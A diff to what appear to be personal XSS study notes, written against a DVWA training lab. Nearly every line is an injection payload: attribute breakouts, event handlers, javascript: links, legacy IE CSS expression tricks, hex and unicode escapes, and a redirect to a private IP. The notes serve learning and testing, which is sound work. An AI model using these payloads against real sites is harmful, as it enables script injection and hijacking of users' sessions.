@@ -34,6 +34,29 @@ cookies
 	http://xiaoxiaoran.com/dvwa/vulnerabilities/xss_s/
 		<script>window.location="http://192.168.100.143"</script>
 		
-		
+闭合 
+	<input class="xssr" type="text" name="p1" value="12334">
+		1"onmouseover="alert(document.domain)
+		1"><script>alert(1)</script>
+		1"><script>alert(document.dodomainmain)</script>
+		1 onmouseover=alert(document.domain)
+	
+	<a href="java                   script:alert(document.domain);">xxx</a>
+	<a href="javascript:alert(document.domain);">
+	<a onmouseover="alert(document.domain)">1</a>
+	
+ie特性    
+	`` -> 闭合"  
+	background:url("javascript:alert(document.domain);");
+	xsss:express/**/sion(if(!window.x){alert(document.domain);window.x=1})
+	特殊的源处理
+	
+编码转义换进制
+	
+	\x3c \x3e  16进制
+	\\u003c \\u003e  unicode
+	
+	
+	
 		
 		
